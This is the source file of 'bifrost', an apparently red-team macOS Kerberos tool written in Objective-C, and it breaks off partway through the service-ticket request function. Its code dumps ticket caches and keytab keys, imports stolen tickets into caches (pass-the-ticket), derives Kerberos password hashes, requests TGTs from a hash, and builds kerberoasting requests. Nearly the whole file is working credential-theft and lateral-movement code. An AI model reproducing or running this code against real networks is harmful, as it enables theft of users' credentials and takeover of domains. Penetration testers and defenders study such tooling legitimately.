//
//  bifrost.m
//  bifrost
//
//  Created by @its_a_feature_ on 10/14/19.
//  Copyright © 2019 Cody Thomas (@its_a_feature_). All rights reserved.
//

#import "bifrost.h"

void printKrbError(krb5_context context, krb5_error_code ret){
    const char *error =  krb5_get_error_message(context, ret);
    printf("[-] %s\n", error);
    krb5_free_error_message(context, error);
}

@implementation bifrost
-(int)getEncValueFromEnctype:(NSString*)enctypeString{
    if( [enctypeString isEqualToString:@"aes256"] ){
        return ENCTYPE_AES256_CTS_HMAC_SHA1_96;
    } else if( [enctypeString isEqualToString:@"aes128"] ){
        return ENCTYPE_AES128_CTS_HMAC_SHA1_96;
    } else if( [enctypeString isEqualToString:@"rc4"] ){
        return ENCTYPE_ARCFOUR_HMAC;
    } else if( [enctypeString isEqualToString:@"des3"] ){
        return ENCTYPE_DES3_CBC_SHA1;
    }
    else {
        return 0;
    }
}
-(NSString*)dumpCredentialsToKirbiCCache: (char*)ccache Destroy:(bool)destroy{
    krb5_context context;
    krb5_cc_cursor cursor;
    krb5_error_code ret;
    krb5_ccache id;
    krb5_creds creds;
    if ((ret = krb5_init_context (&context) != 0)){
        printKrbError(context,ret);
        return NULL;
    }
    if(ccache == NULL){
        ret = krb5_cc_default(context, &id);
    } else{
        ret = krb5_cc_resolve(context, ccache, &id);
    }
    if (ret){
        printKrbError(context,ret);
        return NULL;
    }
    ret = krb5_cc_start_seq_get(context, id, &cursor);
    if (ret){
        printKrbError(context,ret);
        return NULL;
    }
    while((ret = krb5_cc_next_cred(context, id, &cursor, &creds)) == 0){
        Krb5Ticket tkt;
        tkt.app29 = [[KerbApp29 alloc] init];
        char* principal;
        krb5_unparse_name(context, creds.server, &principal);
        
        tkt.app29.enctype29 = [[KerbInteger alloc] initWithValue:creds.keyblock.enctype];
        tkt.app29.key = [[KerbOctetString alloc] initWithValue:[[NSData alloc] initWithBytes:creds.keyblock.contents length:creds.keyblock.length]];
        tkt.app29.realm29 = [[KerbGenericString alloc] initWithValue:[[NSString alloc] initWithCString:creds.server->realm.data encoding:NSUTF8StringEncoding]];
        tkt.app29.flags = [[KerbBitString alloc] initWithValue:creds.ticket_flags];
        NSDateFormatter *format = [[NSDateFormatter alloc] init];
        format.dateFormat = @"YYYYMMddHHmmss";
        format.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
        NSMutableString* startTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.starttime]]];
        [startTime appendString:@"Z"];
        tkt.app29.start = [[KerbGeneralizedTime alloc] initWithValue:startTime];
        NSMutableString* renewTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.renew_till]]];
        [renewTime appendString:@"Z"];
        tkt.app29.till = [[KerbGeneralizedTime alloc] initWithValue:renewTime];
        NSMutableString* endTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.endtime]]];
        [endTime appendString:@"Z"];
        tkt.app29.end = [[KerbGeneralizedTime alloc] initWithValue:endTime];
        tkt.app29.sname29 = [[KerbSNamePrincipal alloc] initWithValueAccount:[[NSString alloc] initWithCString:(creds.server->data)[0].data encoding:NSUTF8StringEncoding] Domain:[[NSString alloc] initWithCString:(creds.server->data)[1].data encoding:NSUTF8StringEncoding]];
        tkt.app29.sname29.krb5_nt_srv_inst = [[KerbInteger alloc] initWithValue:creds.server->type];
        tkt.app29.cname = [[KerbCNamePrincipal alloc] initWithValueUsername:[[NSString alloc] initWithCString:(creds.client->data)[0].data encoding:NSUTF8StringEncoding]];
        tkt.app29.cname.krb5_int_principal = [[KerbInteger alloc] initWithValue:creds.client->type];
        
        char *client;
        krb5_unparse_name(context, creds.client, &client);
        printf("\nClient: %s\n", client);
        printf("Principal: %s\n", principal);
        if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_AES128_CTS_HMAC_SHA1_96){
            printf("Key enctype: aes128\n");
        }else if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_DES3_CBC_SHA1){
            printf("Key enctype: des3\n");
        }else if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_AES256_CTS_HMAC_SHA1_96){
            printf("Key enctype: aes256\n");
        }else if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_ARCFOUR_HMAC){
            printf("Key enctype: rc4");
        }else{
            printf("Key enctype: %d\n", tkt.app29.enctype29.KerbIntValue);
        }
        //printf("\tKey length: %d\n", tkt.app29.key.KerbOctetvalue.length);
        printf("Key: %s (", [tkt.app29.key.KerbOctetvalue base64EncodedStringWithOptions:0].UTF8String);
        for(int i = 0; i < tkt.app29.key.KerbOctetvalue.length; i++){
            printf("%02X", ((Byte*)tkt.app29.key.KerbOctetvalue.bytes)[i]);
        }
        printf(")\n");
        printf("Expires: %s\n", [tkt.app29.end printTimeUTC].UTF8String);
        printf("Flags: %s\n", describeFlags(tkt.app29.flags.KerbBitValue).UTF8String);
        krb5_authdata **authdata = creds.authdata;
        krb5_authdata curAuthdata;
        if(authdata != NULL){
            printf("Authdata: ");
            for(int i = 0; authdata[i] != NULL; i++){
                curAuthdata = *authdata[i];
                for(int j = 0; j < curAuthdata.length; j++){
                    printf("%02X", curAuthdata.contents[j]);
                }
                printf("\n");
            }
        }
        NSString* xcacheconf = @"X-CACHECONF";
        NSString* nsprincipal = [[NSString alloc] initWithCString:principal encoding:NSUTF8StringEncoding];
        if([nsprincipal containsString:xcacheconf]){
            //krb5_cc_get_config(krb5_context, krb5_ccache,krb5_const_principal,const char *, krb5_data *)
            printf("Principal type: %s\n", (creds.server->data)[1].data);
            printf("Ticket Data: \n%s\n", [[[NSData alloc] initWithBytes:creds.ticket.data length:creds.ticket.length] base64EncodedStringWithOptions:0].UTF8String);
        }
        else{
            tkt.app1 = [[KerbApp1 alloc] initWithObject:[[ASN1_Obj alloc] initWithType:0x61 Length:creds.ticket.length Data:[[NSData alloc] initWithBytes:creds.ticket.data length:creds.ticket.length]]];
            NSData* kirbi = createKirbi(tkt);
            printf("Kirbi:\n%s\n\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
        }
        krb5_free_cred_contents (context, &creds);
    }
    ret = krb5_cc_end_seq_get(context, id, &cursor);
    if (ret){
        printKrbError(context,ret);
        return NULL;
    }
    if(destroy && ccache != NULL){
        ret = krb5_cc_destroy (context, id);
        if (ret){
            printKrbError(context,ret);
            return NULL;
        } else{
            printf("[+] Removed CCache entry: %s\n", ccache);
        }
    }else{
        krb5_cc_close(context, id);
    }
    krb5_free_context(context);
    return @"Finished";
}
-(void)listAllCCaches{
    krb5_context context;
    krb5_cccol_cursor cursor;
    krb5_cc_cursor cc_cursor;
    krb5_error_code ret;
    krb5_ccache entry;
    krb5_principal principal;
    krb5_creds creds;
    if ((ret = krb5_init_context (&context) != 0)){
        printKrbError(context,ret);
        return;
    }
    NSString* defaultName = [[NSString alloc] initWithUTF8String:krb5_cc_default_name(context)];
    krb5_cccol_cursor_new(context, &cursor);
    while((ret = krb5_cccol_cursor_next(context, cursor, &entry)) == 0){
        NSMutableString* name = [[NSMutableString alloc] initWithUTF8String:krb5_cc_get_type (context, entry)];
        [name appendFormat:@":%s", krb5_cc_get_name(context, entry) ];
        
        ret = krb5_cc_get_principal (context, entry,&principal);
        if(ret){
            printKrbError(context, ret);
            continue;
        }
        char* principalString;
        krb5_unparse_name(context, principal , &principalString);
        
        if([defaultName isEqualToString:name]){
            printf("\n[*] Principal: %s\n    Name: %s", principalString, name.UTF8String);
        }else{
            printf("\n[+] Principal: %s\n    Name: %s", principalString, name.UTF8String);
        }
        // now loop through the entries of that cache and list them (not dump though)
        ret = krb5_cc_start_seq_get(context, entry, &cc_cursor);
        if (ret){
            printKrbError(context,ret);
            return;
        }
        printf("\n\tIssued\t\t\t Expires\t\t\t    Principal\t\t\t\t\tFlags\n");
        while((ret = krb5_cc_next_cred(context, entry, &cc_cursor, &creds)) == 0){
            char* principal;
            krb5_unparse_name(context, creds.server, &principal);
            char *client;
            krb5_unparse_name(context, creds.client, &client);
            
            NSDateFormatter *format = [[NSDateFormatter alloc] init];
            format.dateFormat = @"YYYY-MM-dd HH:mm:sszz";

            NSMutableString* startTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.starttime]]];

            NSMutableString* endTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.endtime]]];
            
            printf("%s\t%s\t%s\t(%s)\n", startTime.UTF8String, endTime.UTF8String, principal, describeFlags(creds.ticket_flags).UTF8String);
            
            krb5_free_cred_contents (context, &creds);
        }
        krb5_cc_end_seq_get(context, entry, &cc_cursor);
        krb5_cc_close(context, entry);
    }
    krb5_cccol_cursor_free(context, &cursor);
    krb5_free_context(context);
    //krb5_cc_get_config(krb5_context, krb5_ccache,krb5_const_principal,const char *, krb5_data *)
    return;
}
-(krb5_creds)createKrb5CredFromKrb5Ticket:(Krb5Ticket)ticket{
    krb5_creds cred;
    krb5_context context;
    krb5_error_code ret;
    printf("[*] Converting ticket to ccache cred\n");
    if ((ret = krb5_init_context (&context) != 0)){
        printKrbError(context,ret);
        return cred;
    }
    cred.addresses = NULL;
    cred.authdata = NULL;
    cred.is_skey = false;
    cred.ticket.data = (char*)[ticket.app1 collapseToNSData].bytes;
    cred.ticket.length = (unsigned int)[ticket.app1 collapseToNSData].length;
    cred.ticket.magic = KV5M_TICKET;
    cred.ticket_flags = ticket.app29.flags.KerbBitValue;
    cred.keyblock.magic = KV5M_KEYBLOCK;
    cred.keyblock.enctype = ticket.app29.enctype29.KerbIntValue;
    cred.keyblock.length = (unsigned int)ticket.app29.key.KerbOctetvalue.length;
    cred.keyblock.contents = (unsigned char*)ticket.app29.key.KerbOctetvalue.bytes;
    krb5_principal sname;
    ret = krb5_build_principal(context, &sname, 2, ticket.app29.realm29.KerbGenStringvalue.UTF8String, ticket.app29.sname29.account.KerbGenStringvalue.UTF8String, ticket.app29.sname29.domain.KerbGenStringvalue.UTF8String, nil);
    if (ret){
        printKrbError(context,ret);
        printf("[-] Failed to build principal for ccache cred\n");
        return cred;
    }
    cred.server = sname;
    cred.magic = KV5M_CREDS;
    //convert generalizedTime formats back to integers
    NSDateFormatter *format = [[NSDateFormatter alloc] init];
    format.dateFormat = @"YYYYMMddHHmmssZ";
    format.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
    NSDate* ticketTime = [format dateFromString:ticket.app29.start.value];
    cred.times.starttime = ticketTime.timeIntervalSince1970;
    cred.times.authtime = cred.times.starttime;
    ticketTime = [format dateFromString:ticket.app29.end.value];
    cred.times.endtime = ticketTime.timeIntervalSince1970;
    ticketTime = [format dateFromString:ticket.app29.till.value];
    cred.times.renew_till = ticketTime.timeIntervalSince1970;
    //convert cname
    krb5_principal cname;
    ret = krb5_build_principal(context, &cname, 1, ticket.app1.realm.KerbGenStringvalue.UTF8String, ticket.app29.cname.username.KerbGenStringvalue.UTF8String, nil);
    if (ret){
        printKrbError(context,ret);
        printf("[-] Failed to build principal for ccache cred\n");
        return cred;
    }
    cred.client = cname;
    printf("[+] Successfully converted ticket to ccache cred\n");
    return cred;
}
-(NSString*)importCred:(NSString*)ticketKirbi ToCache:(NSString*)cacheName{
    krb5_ccache cache;
    krb5_context context;
    krb5_error_code ret;
    krb5_creds cred;
    Krb5Ticket ticket = parseKirbi([[NSData alloc] initWithBase64EncodedString:ticketKirbi options:0]);
    if(ticket.app29 == NULL){
        printf("[-] Failed to parse Kirbi data\n");
        return NULL;
    }else{
        printf("[+] Successfully parsed Kirbi data\n");
    }
    cred = [self createKrb5CredFromKrb5Ticket:ticket];
    if ((ret = krb5_init_context (&context) != 0)){
        printKrbError(context,ret);
        return NULL;
    }
    if([cacheName isEqualToString:@"new"]){
        printf("[*] Creating new ccache\n");
        ret = krb5_cc_new_unique( context,"API","test", &cache);
        if(ret){
            printKrbError(context,ret);
            printf("[-] Failed to create new ccache\n");
            return NULL;
        }
        //krb5_cc_initialize(context, entry, principal);
        ret = krb5_cc_initialize(context, cache, cred.client);
    }else{
        printf("[*] Resolving ccache name %s\n", cacheName.UTF8String);
        ret = krb5_cc_resolve(context, cacheName.UTF8String, &cache);
    }
    if(ret){
        printKrbError(context,ret);
        printf("[-] Failed to get ccache\n");
        return NULL;
    }
    //krb5_cc_store_cred (krb5_context context, krb5_ccache cache, krb5_creds *creds)
    printf("[*] Saving credential for %s\n", [ticket.app29.sname29 getNSString].UTF8String);
    //this crashes with "storage_set_flags called with bad vno(0)" if the file already exists
    ret = krb5_cc_store_cred(context, cache, &cred);
    if(ret){
        printKrbError(context,ret);
        printf("[-] Failed to store cred, trying to initialize first\n");
        //can't store cred to a new store without initializing it, so make sure to do that if storing fails
        ret = krb5_cc_initialize(context, cache, cred.client);
        if(ret){
            printKrbError(context,ret);
            printf("[-] Failed to initialize cache\n");
            return NULL;
        }
        printf("[+] Successfully initialized cache\n");
    }
    ret = krb5_cc_store_cred(context, cache, &cred);
    if(ret){
        printKrbError(context, ret);
        printf("[-] Failed to store credential\n");
        return NULL;
    }
    printf("[+] Successfully imported credential\n");
    return [[NSString alloc] initWithFormat:@"%s", krb5_cc_get_name(context, cache) ];
}
-(NSString*)removeCacheName:(NSString*)cacheName{
    //krb5_cc_destroy (context, entry);
    krb5_context context;
    krb5_error_code ret;
    krb5_ccache cache;
    if ((ret = krb5_init_context (&context) != 0)){
        printKrbError(context,ret);
        return @"error\n";
    }
    printf("[*] Resolving CCache name: %s\n", cacheName.UTF8String);
    ret = krb5_cc_resolve(context, cacheName.UTF8String, &cache);
    if(ret){
        printKrbError(context, ret);
        return @"error\n";
    }
    printf("[+] Successfully resolved CCache name\n");
    ret = krb5_cc_destroy(context, cache);
    if(ret){
        printKrbError(context, ret);
        return @"error\n";
    }
    printf("[+] Successfully removed CCache\n");
    return @"success\n";
}
-(NSString*)removePrincipal:(NSString*)principal FromCacheName:(NSString*)cacheName{
    //krb5_cc_remove_cred is not implemented by the MITKerberosShim, need to find a different way
    //krb5_cc_remove_cred (krb5_context context, krb5_ccache cache, krb5_flags flags,krb5_creds *creds)
    NSString* result = @"[-] Failed to find principal\n";
    krb5_context context;
    krb5_error_code ret;
    krb5_ccache cache;
    krb5_cc_cursor cc_cursor;
    krb5_creds creds;
    if ((ret = krb5_init_context (&context) != 0)){
        printKrbError(context,ret);
        return @"error\n";
    }
    ret = krb5_cc_resolve(context, cacheName.UTF8String, &cache);
    if(ret){
        printKrbError(context, ret);
        return @"error\n";
    }
    printf("[+] Successfully resolved CCache name\n");
    //now actually loop through the cache to find the specified principal
    ret = krb5_cc_start_seq_get(context, cache, &cc_cursor);
    if (ret){
        printKrbError(context,ret);
        return @"error\n";
    }
    while((ret = krb5_cc_next_cred(context, cache, &cc_cursor, &creds)) == 0){
        char* curPrincipal;
        krb5_unparse_name(context, creds.server, &curPrincipal);
        if(strcmp(principal.UTF8String, curPrincipal) == 0){
            //we found the right principal, so now we need to remove it
            printf("[+] Found Principal entry\n");
            //MITKerberosShim: function krb5_cc_remove_cred not implemented :'(
            ret = krb5_cc_remove_cred(context, cache, 8, &creds);
            if(ret){
                printf("[-] Failed to remove cred\n");
                printKrbError(context, ret);
                result = @"error\n";
            }else{
                result = @"[+] Successfully removed\n";
            }
        }
        krb5_free_cred_contents (context, &creds);
    }
    krb5_cc_end_seq_get(context, cache, &cc_cursor);
    krb5_cc_close(context, cache);
    return result;
}
-(NSString*)ktutilKeyTabPath:(NSString*)keyTabPath{
    krb5_context context;
    krb5_keytab keytab;
    krb5_kt_cursor cursor;
    krb5_keytab_entry entry;
    krb5_error_code ret;
    krb5_keyblock key;
    char *principal;
    if ((ret = krb5_init_context (&context) != 0)){
        printKrbError(context,ret);
        return @"Error";
    }
    if(keyTabPath != NULL){
        printf("[*] Resolving keytab path\n");
        ret = krb5_kt_resolve(context, keyTabPath.fileSystemRepresentation, &keytab);
    }else{
        printf("[*] Resolving default keytab path\n");
        ret = krb5_kt_default (context, &keytab);
    }
    if (ret){
        printKrbError(context,ret);
        return @"Error";
    }
    
    ret = krb5_kt_start_seq_get(context, keytab, &cursor);
    if (ret){
       printKrbError(context,ret);
        return @"Error";
    }
    printf("[+] Successfully opened keytab\n");
    while((ret = krb5_kt_next_entry(context, keytab, &entry, &cursor)) == 0){
        krb5_unparse_name(context, entry.principal, &principal);
        printf("[+] principal: %s\n", principal);
        key = entry.key;
        printf("\tEntry version: %d\n", entry.vno);
        if(key.enctype == ENCTYPE_AES128_CTS_HMAC_SHA1_96){
            printf("\tKey enctype: aes128\n");
        }else if(key.enctype == ENCTYPE_DES3_CBC_SHA1){
            printf("\tKey enctype: des3\n");
        }else if(key.enctype == ENCTYPE_AES256_CTS_HMAC_SHA1_96){
            printf("\tKey enctype: aes256\n");
        }else if(key.enctype == ENCTYPE_ARCFOUR_HMAC){
            printf("\tKey enctype: rc4\n");
        }
        else{
            printf("\tKey enctype: %d\n", key.enctype);
        }
        //printf("Key length: %d\n", key.length);
        printf("\tKey: ");
        for(int i = 0; i < key.length; i++){
            printf("%02X", key.contents[i]);
        }
        printf("\n");
        NSDateFormatter *newFormatter = [[NSDateFormatter alloc] init];
        newFormatter.dateFormat = @"YYYY-MM-dd HH:mm:ss z";
        newFormatter.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
        NSDate* ticketTime = [[NSDate alloc] initWithTimeIntervalSince1970:entry.timestamp ];
        printf("\tTimestamp: %s\n",[newFormatter stringFromDate:ticketTime].UTF8String );
        free(principal);
        //krb5_kt_free_entry(context, &entry);
    }
    ret = krb5_kt_end_seq_get(context, keytab, &cursor);
    if (ret){
        printKrbError(context,ret);
        return @"Error";
    }
        //krb5_err(context, 1, ret, "krb5_kt_end_seq_get");
    ret = krb5_kt_close(context, keytab);
    if (ret){
        printKrbError(context,ret);
        return @"Error";
    }
        //krb5_err(context, 1, ret, "krb5_kt_close");
    krb5_free_context(context);
    return @"Finished";
}
-(NSString*)removePrincipal:(NSString*)targetPrincipal fromKeytab:(NSString*)keyTabPath{
    krb5_context context;
    krb5_keytab keytab;
    krb5_kt_cursor cursor;
    krb5_keytab_entry entry;
    krb5_error_code ret;
    char *principal;
    if ((ret = krb5_init_context (&context) != 0)){
        printKrbError(context,ret);
        return @"Error";
    }
    if(keyTabPath != NULL){
        printf("[*] Resolving keytab path\n");
        ret = krb5_kt_resolve(context, keyTabPath.fileSystemRepresentation, &keytab);
    }else{
        printf("[*] Resolving default keytab path\n");
        ret = krb5_kt_default (context, &keytab);
    }
    if (ret){
        printKrbError(context,ret);
        return @"Error";
    }
    
    ret = krb5_kt_start_seq_get(context, keytab, &cursor);
    if (ret){
       printKrbError(context,ret);
        return @"Error";
    }
    printf("[+] Successfully opened keytab\n");
    printf("[*] Searching for principal\n");
    while((ret = krb5_kt_next_entry(context, keytab, &entry, &cursor)) == 0){
        krb5_unparse_name(context, entry.principal, &principal);
        if(strcmp(principal, targetPrincipal.UTF8String) == 0){
            printf("[*] Found match, removing entry\n");
            ret = krb5_kt_remove_entry(context, keytab, &entry);
            if(ret){
                printf("[-] Failed to remove entry: %s, %d\n", principal, entry.key.enctype);
                continue;
            }else{
                printf("[+] Successfully removed entry: %s\n", principal);
            }
        }else{
            free(principal);
        }
        //krb5_kt_free_entry(context, &entry);
    }
    ret = krb5_kt_end_seq_get(context, keytab, &cursor);
    if (ret){
        printKrbError(context,ret);
        return @"Error";
    }
        //krb5_err(context, 1, ret, "krb5_kt_end_seq_get");
    ret = krb5_kt_close(context, keytab);
    if (ret){
        printKrbError(context,ret);
        return @"Error";
    }
        //krb5_err(context, 1, ret, "krb5_kt_close");
    krb5_free_context(context);
    return @"Finished";
}
-(NSString*)getKeyFromKeytab:(NSString*)keyTabPath andPrincipal:(NSString*)targetPrincipal withEnctype:(int)enctype{
    NSMutableString* hash = NULL;
    krb5_context context;
    krb5_keytab keytab;
    krb5_kt_cursor cursor;
    krb5_keytab_entry entry;
    krb5_error_code ret;
    char *principal;
    if ((ret = krb5_init_context (&context) != 0)){
        printKrbError(context,ret);
        return NULL;
    }
    if(keyTabPath != NULL){
        printf("[*] Resolving keytab path: %s\n", keyTabPath.UTF8String);
        ret = krb5_kt_resolve(context, keyTabPath.fileSystemRepresentation, &keytab);
    }else{
        printf("[*] Resolving default keytab path\n");
        ret = krb5_kt_default (context, &keytab);
    }
    if (ret){
        printKrbError(context,ret);
        return NULL;
    }
    ret = krb5_kt_start_seq_get(context, keytab, &cursor);
    if (ret){
        printKrbError(context,ret);
        return NULL;
    }
    printf("[+] Successfully opened keytab\n");
    printf("[*] Searching for principal: %s\n", targetPrincipal.UTF8String);
    while((ret = krb5_kt_next_entry(context, keytab, &entry, &cursor)) == 0){
        krb5_unparse_name(context, entry.principal, &principal);
        if(strcmp(principal, targetPrincipal.UTF8String) == 0){
            if(enctype == entry.key.enctype){
                hash = [[NSMutableString alloc] initWithString:@""];
                printf("[*] Found match, retrieving key\n");
                for(int i = 0; i < entry.key.length; i++){
                    [hash appendFormat:@"%02X", entry.key.contents[i]];
                }
                break;
            }
        }
        free(principal);
    }
    ret = krb5_kt_end_seq_get(context, keytab, &cursor);
    if (ret){
        printKrbError(context,ret);
        return NULL;
    }
        //krb5_err(context, 1, ret, "krb5_kt_end_seq_get");
    ret = krb5_kt_close(context, keytab);
    if (ret){
        printKrbError(context,ret);
        return NULL;
    }
        //krb5_err(context, 1, ret, "krb5_kt_close");
    krb5_free_context(context);
    if(hash == NULL){
        printf("[-] Failed to find principal and enc type in keytab\n");
    }
    return hash;
}
-(NSString*)genPasswordHashPassword:(NSString*)password  Enc:(int)enc_type Username:(NSString*)username Domain:(NSString*)domain{
    krb5_context context;
    krb5_error_code ret;
    NSString *final_key = @"";
    if ((ret = krb5_init_context (&context) != 0)){
        printKrbError(context,ret);
        return @"Error getting krb5 context";
    }
    krb5_data data;
    data.data = (char*)password.UTF8String;
    data.magic = KV5M_KEYBLOCK;
    data.length =  (uint)password.length;

    // to generate the right salt
    //https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/
    krb5_data salt;
    NSString* combined_salt = [domain uppercaseString];
    if([username containsString:@"$"]){
        //this means we're looking at a computer account, so the salt is a little different
        NSString* nodollar = [username substringToIndex:username.length -1];
        combined_salt = [combined_salt stringByAppendingFormat:@"host%s.%s", [nodollar lowercaseString].UTF8String, [domain lowercaseString].UTF8String];
    }else{
        combined_salt = [combined_salt stringByAppendingString:username];
    }
    final_key = [final_key stringByAppendingFormat:@"Username: %s\nPassword: %s\nDomain: %s\nSalt: %s\n\nKeys:\n", username.UTF8String, password.UTF8String, domain.UTF8String, combined_salt.UTF8String];
    salt.data = (char*)combined_salt.UTF8String;
    salt.magic = KV5M_KEYBLOCK;
    salt.length = (int)combined_salt.length;
    krb5_keyblock newKey;
    if(enc_type == 0){
        // go  through  to generate the most common hash types
        final_key = [final_key stringByAppendingString:@"AES128: "];
        ret = krb5_c_string_to_key(context, ENCTYPE_AES128_CTS_HMAC_SHA1_96, &data, &salt, &newKey);
        for(int i = 0; i < newKey.length; i++){
            final_key = [final_key stringByAppendingString:[NSString stringWithFormat:@"%02X", newKey.contents[i]]];
        }
        final_key = [final_key stringByAppendingString:@"\nAES256: "];
        ret = krb5_c_string_to_key(context, ENCTYPE_AES256_CTS_HMAC_SHA1_96, &data, &salt, &newKey);
        for(int i = 0; i < newKey.length; i++){
            final_key = [final_key stringByAppendingString:[NSString stringWithFormat:@"%02X", newKey.contents[i]]];
        }
        final_key = [final_key stringByAppendingString:@"\nRC4   : "];
        ret = krb5_c_string_to_key(context, ENCTYPE_ARCFOUR_HMAC, &data, &salt, &newKey);
        for(int i = 0; i < newKey.length; i++){
            final_key = [final_key stringByAppendingString:[NSString stringWithFormat:@"%02X", newKey.contents[i]]];
        }
    }else{
        ret = krb5_c_string_to_key(context, enc_type, &data, &salt, &newKey);
        for(int i = 0; i < newKey.length; i++){
            final_key = [final_key stringByAppendingString:[NSString stringWithFormat:@"%02X", newKey.contents[i]]];
        }
    }
    return final_key;
}
//lots of base code pulled from https://github.com/viveksjain/heracles/blob/master/Heracles/HeraclesAppDelegate.m for the following
-(NSString*)getKerberosErrorMessage:(KLStatus)error {
    char *message;
    KLGetErrorString(error, &message);
    NSString *messageStr = [[NSString alloc] initWithUTF8String:message];
    KLDisposeString(message);
    if ([messageStr hasSuffix:@"\n"]) messageStr = [messageStr substringToIndex:([messageStr length] - 1)]; // Strip last newline
    return messageStr;
}
-(NSString*)checkAcquireTicketsError:(KLStatus)status {
    if (status == KRB5_KDC_UNREACH) {
        return @"[-] Unable to contact the Kerberos server.";
    } else if (status == KRB5KDC_ERR_PREAUTH_FAILED) return @"[-] Incorrect username or password.";
    
    NSString *errorMessage = [self getKerberosErrorMessage:status];
    printf("[-] Error acquiring tickets: %d: %s", status, errorMessage.UTF8String);
    return [[NSString alloc] initWithFormat:@"[-] Error acquiring tickets: %@.", errorMessage];
}
-(NSString*)getTGTUsername:(NSString*)usernameToUse Password:(NSString*)passwordToUse Domain:(NSString*)domainToUse{
    KLPrincipal principal;
    NSString* fullPrincipal = usernameToUse;
    fullPrincipal = [fullPrincipal stringByAppendingString:@"@"];
    fullPrincipal = [fullPrincipal stringByAppendingString:domainToUse];
    printf("[*] Requesting principal: %s\n", fullPrincipal.UTF8String);
    printf("[*] Requesting password: %s\n", passwordToUse.UTF8String);
    KLStatus status = KLCreatePrincipalFromString([fullPrincipal UTF8String], kerberosVersion_V5, &principal);
    if (status != klNoErr) {
        KLDisposePrincipal(principal);
        printf("[-] Error creating principal: %d: %s", status, [self getKerberosErrorMessage:status].UTF8String);
        return NULL;
    }else{
        char* displayPrincipal;
        KLGetDisplayStringFromPrincipal(principal, kerberosVersion_V5, &displayPrincipal);
        printf("[*] Creating TGT Request for %s\n", displayPrincipal);
    }
    krb5_context context;
    krb5_init_context (&context);
    krb5_ccache newCcache;
    char* credCacheName;
    printf("[*] Requesting TGT into temporary CCache\n");
    status = KLAcquireNewInitialTicketsWithPassword(principal, NULL, [passwordToUse UTF8String], &credCacheName);
    if (status == klNoErr) {
        NSMutableString* fullCredCacheName = [[NSMutableString alloc] initWithUTF8String:"API:"];
        [fullCredCacheName appendString:[[NSString alloc] initWithUTF8String:credCacheName]];
        printf("[+] Successfully got TGT into new CCache: %s\n", fullCredCacheName.UTF8String);
        printf("[*] Dumping ticket from new CCache and removing entry\n");
        [self dumpCredentialsToKirbiCCache:fullCredCacheName.UTF8String Destroy:true];
        KLDisposePrincipal(principal);
    } else {
        KLDisposePrincipal(principal);
        printf("[-] %s\n", [self checkAcquireTicketsError:status].UTF8String);
        return NULL;
    }
    return [[NSString alloc] initWithFormat:@"[+] Successfully obtained Kerberos ticket for principal %@.", usernameToUse];
}
-(NSString*)askTGTConnectDomain:(NSString*)connectDomain EncType:(int)enctype Hash:(NSString*)hash Username:(NSString*)username Domain:(NSString*)domain SupportAll:(bool)supportAll TgtEnctype:(int)tgtEnctype{
    //returns a base64 Kirbi version of the TGT
    kdc* kerbdc = [kdc alloc];
    int result = [kerbdc connectDomain:domain.UTF8String];
    if(result == -1){
        return NULL;
    }
    NSData* test = createASREQ(enctype, hash, username, domain, supportAll, tgtEnctype);
    result = [kerbdc sendBytes:test];
    if(result == -1){
        return NULL;
    }else{
        printf("[+] Successfully sent ASREQ\n");
    }
    NSData* holder = [kerbdc recvBytes];
    if(holder == NULL){
        return NULL;
    }else{
        printf("[+] Successfully received ASREP\n");
    }
    NSData* asrep = [[NSData alloc] initWithBytes:(Byte*)holder.bytes length:holder.length];
    Krb5Ticket tgt = parseASREP(asrep, hash, enctype);
    if(tgt.app29 != NULL){
        printf("[*] Describing ticket\n");
        printf("%s\n", describeTicket(tgt).UTF8String);
        printf("[*] Creating Kirbi:\n");
        NSData* kirbi = createKirbi(tgt);
        printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
        return [kirbi base64EncodedStringWithOptions:0];
    }else{
        return NULL;
    }
}
-(NSString*)askTGSConnectDomain:(NSString*)connectDomainInput TGT:(NSString*)tgtKirbi Service:(NSString*)service ServiceDomain:(NSString*)serviceDomainInput Kerberoast:(bool)kerberoasting{
    NSString* connectDomain = connectDomainInput;
    NSString* serviceDomain = serviceDomainInput;
    Krb5Ticket TGT = parseKirbi([[NSData alloc] initWithBase64EncodedString:tgtKirbi options:0]);
    if(TGT.app29 == NULL){
        printf("[-] Failed to parse kirbi file\n");
        return NULL;
    }
    if(connectDomain == NULL){
        connectDomain = TGT.app1.realm.KerbGenStringvalue;
    }
    if(serviceDomain == NULL){
        serviceDomain = TGT.app1.realm.KerbGenStringvalue;
    }
    kdc* kerbdc = [kdc alloc];
    int result = [kerbdc connectDomain:connectDomain.UTF8String];
    if(result == -1){
        return NULL;
    }
    printf("[*] Requesting service ticket to %s as %s\n", service.UTF8String, TGT.app29.cname.username.KerbGenStringvalue.UTF8String);
    NSData* tgsreq = createTGSREQ(TGT, service, kerberoasting, serviceDomain);

    result = [kerbdc sendBytes:tgsreq];
    if(result == -1){
        return NULL;
    }else{
        printf("[+] Successfully sent TGSREQ\n");
    }
    NSData* holder = [kerbdc recvBytes];
    if(holder == NULL){
        return NULL;
    }else{
        printf("[+] Successfully received TGSREP\n");
    }
    Krb5Ticket sTicket = parseTGSREP(holder, TGT);
    if(sTicket.app29 != NULL){
        printf("[*] Describing ticket\n");
        printf("%s\n", describeTicket(sTicket).UTF8String);
        printf("[*] Creating Kirbi:\n");
        NSData* kirbi = createKirbi(sTicket);
        printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
